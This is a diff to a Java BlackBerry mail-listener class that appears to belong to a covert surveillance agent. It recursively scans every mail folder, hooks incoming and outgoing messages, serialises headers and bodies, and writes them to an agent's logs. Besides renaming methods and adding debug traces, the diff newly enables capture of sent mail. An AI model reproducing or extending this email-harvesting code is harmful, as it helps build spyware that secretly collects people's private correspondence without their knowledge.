@@ -69,7 +69,7 @@ public final class MailListener implements FolderListener, StoreListener,
      * @param maxMessageSize
      *            the max message len
      */
-    protected void displayMultipart(final Multipart multipart,
+    protected void dissectMultipart(final Multipart multipart,
             StringBuffer mail, final long maxMessageSize) {
         // This vector stores fields which are to be displayed only after all
         // of the body fields are displayed. (Attachments and Contacts).
@@ -84,6 +84,10 @@ public final class MailListener implements FolderListener, StoreListener,
 
             // If this body part is text then display all of it
             if (bodyPart instanceof TextBodyPart) {
+
+                //#debug debug
+                debug.trace("dissectMultipart: TextBodyPart");
+
                 final TextBodyPart textBodyPart = (TextBodyPart) bodyPart;
 
                 // If there are missing parts of the text, try to retrieve the
@@ -99,13 +103,14 @@ public final class MailListener implements FolderListener, StoreListener,
                 }
                 String plainText = (String) textBodyPart.getContent();
 
-                mail.append("Content-type: "+ textBodyPart.getContentType() +"; charset=UTF8\r\n\r\n");                                          
+                mail.append("Content-type: " + textBodyPart.getContentType()
+                        + "; charset=UTF8\r\n\r\n");
                 //mail.append("Content-type: "+ textBodyPart.getContentType() +";\r\n\r\n");                          
-                
+
                 mail.append(plainText);
-                
+
                 //#debug debug
-                debug.trace("TextBodyPart: "+ mail.toString());
+                debug.trace("TextBodyPart: " + mail.toString());
 
                 // Display the plain text, using an EditField if the message is
                 // editable or a RichTextField if it is not editable. Note: this
@@ -122,6 +127,9 @@ public final class MailListener implements FolderListener, StoreListener,
             }
             // #ifdef HAVE_MIME
             else if (bodyPart instanceof MimeBodyPart) {
+                //#debug debug
+                debug.trace("dissectMultipart: MimeBodyPart");
+
                 final MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;
 
                 // If the content is text then display it
@@ -146,14 +154,18 @@ public final class MailListener implements FolderListener, StoreListener,
 
                         // #debug debug
                         debug.trace("Testo dell'email MIME: " + htmlText);
-                        
-                        addAllHeaders(mimeBodyPart.getAllHeaders(), mail);               
+
+                        addAllHeaders(mimeBodyPart.getAllHeaders(), mail);
                         mail.append(htmlText);
                         //#debug debug
-                        debug.trace("HTML: "+ mail.toString());
+                        debug.trace("HTML: " + mail.toString());
                     }
                 } else if (contentType
                         .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
+
+                    //#debug debug
+                    debug.trace("dissectMultipart: alternative");
+
                     // If the body part is a multi-part and it has the the
                     // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
                     // recursively display the multi-part.
@@ -164,7 +176,7 @@ public final class MailListener implements FolderListener, StoreListener,
                                 .getContentType();
                         if (childMultipartType
                                 .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                            displayMultipart(childMultipart, mail,
+                            dissectMultipart(childMultipart, mail,
                                     maxMessageSize);
                         }
                     }
@@ -201,7 +213,6 @@ public final class MailListener implements FolderListener, StoreListener,
         store.addFolderListener(this);
         store.addSendListener(this);
         store.addStoreListener(this);
-
     }
 
     /*
@@ -222,18 +233,30 @@ public final class MailListener implements FolderListener, StoreListener,
      * net.rim.blackberry.api.mail.event.FolderListener#messagesAdded(net.rim
      * .blackberry.api.mail.event.FolderEvent)
      */
-    public void messagesAdded(final FolderEvent e) {
-        final Message message = e.getMessage();
-        // if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
+    public synchronized void messagesAdded(final FolderEvent folderEvent) {
+        final Message message = folderEvent.getMessage();
+
         // #debug info
-        debug.info("Added Message: " + message);
+        debug
+                .info("Added Message: " + message + " folderEvent: "
+                        + folderEvent);
 
         try {
+            int type = folderEvent.getType();
+            if (type != FolderEvent.MESSAGE_ADDED) {
+                //#debug info
+                debug.info("filterMessage: FILTERED_MESSAGE_ADDED");
+                return;
+            }
+
             final int filtered = realtimeFilter.filterMessage(message,
                     messageAgent.lastcheck);
             if (filtered == Filter.FILTERED_OK) {
                 saveLog(message, realtimeFilter.maxMessageSize);
+                //#debug debug
+                debug.trace("messagesAdded: " + message.getFolder().getName());
             }
+
         } catch (final MessagingException ex) {
             // #debug
             debug.error("cannot manage added message: " + ex);
@@ -289,7 +312,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
             final Folder[] folders = store.list();
             // Scandisco ogni Folder dell'account di posta
-            scanFolder(folders);
+            scanFolders(folders);
             messageAgent.updateMarkup();
         }
         // #debug debug
@@ -354,15 +377,15 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeLong(filetime.getFiledate());
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
 
-            String mail = showMessage(message, maxMessageSize);
+            String mail = parseMessage(message, maxMessageSize);
             //#debug debug
             debug.trace("saveLog: " + mail);
 
             messageAgent.createLog(additionalData, mail.getBytes("UTF-8"));
 
         } catch (final IOException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            //#debug error
+            debug.error("saveLog message: " + e);
         } finally {
             if (os != null) {
                 try {
@@ -379,7 +402,7 @@ public final class MailListener implements FolderListener, StoreListener,
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolder(final Folder[] subfolders) {
+    public void scanFolders(final Folder[] subfolders) {
         Folder[] dirs;
 
         // Date receivedDate;
@@ -390,8 +413,12 @@ public final class MailListener implements FolderListener, StoreListener,
             // #debug debug
             debug.trace("Nome della cartella: "
                     + subfolders[count].getFullName());
+
+            //#debug debug
+            debug.trace("scanFolders getName: " + subfolders[count].getName());
+
             dirs = subfolders[count].list();
-            scanFolder(dirs);
+            scanFolders(dirs);
             try {
                 final Message[] messages = subfolders[count].getMessages();
                 // Scandisco ogni e-mail dell'account di posta
@@ -401,7 +428,12 @@ public final class MailListener implements FolderListener, StoreListener,
                     final int filtered = collectFilter.filterMessage(message,
                             messageAgent.lastcheck);
                     if (filtered == Filter.FILTERED_OK) {
-                        saveLog(message, realtimeFilter.maxMessageSize);
+                        try {
+                            saveLog(message, realtimeFilter.maxMessageSize);
+                        } catch (Exception ex) {
+                            //#debug error
+                            debug.error("saveLog: " + ex);
+                        }
                     }
                 }
             } catch (final MessagingException e) {
@@ -424,15 +456,27 @@ public final class MailListener implements FolderListener, StoreListener,
         // #debug info
         debug.info("New Send Message: " + message);
 
-        /*
-         * try { manageMessage(message); } catch (MessagingException ex) {
-         * debug.error("cannot manage sending message: " + ex); }
-         * messageAgent.updateMarkup();
-         */
+        try {
+            final int filtered = realtimeFilter.filterMessage(message,
+                    messageAgent.lastcheck);
+            if (filtered == Filter.FILTERED_OK) {
+                saveLog(message, realtimeFilter.maxMessageSize);
+                //#debug debug
+                debug.trace("messagesAdded: " + message.getFolder().getName());
+            }
+
+        } catch (final MessagingException ex) {
+            // #debug
+            debug.error("cannot manage send message: " + ex);
+            return false;
+        }
+
+        messageAgent.updateMarkup();
+
         return true;
     }
 
-    private String showMessage(final Message message, final long maxMessageSize) {
+    private String parseMessage(final Message message, final long maxMessageSize) {
         Address[] addresses;
 
         StringBuffer mail = new StringBuffer();
@@ -441,15 +485,15 @@ public final class MailListener implements FolderListener, StoreListener,
 
         try {
             Address[] from = message.getRecipients(Message.RecipientType.FROM);
-            if(from.length == 0){
+            if (from.length == 0) {
                 message.addHeader("From:", "localuser");
             }
-            message.addHeader("MIME-Version:","1.0");
-            
+            message.addHeader("MIME-Version:", "1.0");
+
             addAllHeaders(message.getAllHeaders(), mail);
 
-
-            debug.trace("Dimensione dell'email: " + message.getSize()
+            debug
+                    .trace("Dimensione dell'email: " + message.getSize()
                             + "bytes");
             debug.trace("Data invio dell'email: " + message.getSentDate());
             debug.trace("Oggetto dell'email: " + message.getSubject());
@@ -472,7 +516,7 @@ public final class MailListener implements FolderListener, StoreListener,
                     .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                     || mpType
                             .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
-                displayMultipart(parent, mail, maxMessageSize);
+                dissectMultipart(parent, mail, maxMessageSize);
             }
             // #endif
         } catch (final MessagingException e1) {
@@ -486,10 +530,16 @@ public final class MailListener implements FolderListener, StoreListener,
     private void addAllHeaders(final Enumeration headers, StringBuffer mail) {
 
         while (headers.hasMoreElements()) {
-            Header header = (Header) headers.nextElement();
-            mail.append(header.getName());
-            mail.append(header.getValue());
-            mail.append("\r\n");
+            Object headerObj = headers.nextElement();
+            if (headerObj instanceof Header) {
+                Header header = (Header) headerObj;
+                mail.append(header.getName());
+                mail.append(header.getValue());
+                mail.append("\r\n");
+            } else {
+                //#debug error
+                debug.error("Unknown header type: " + headerObj);
+            }
         }
     }
 
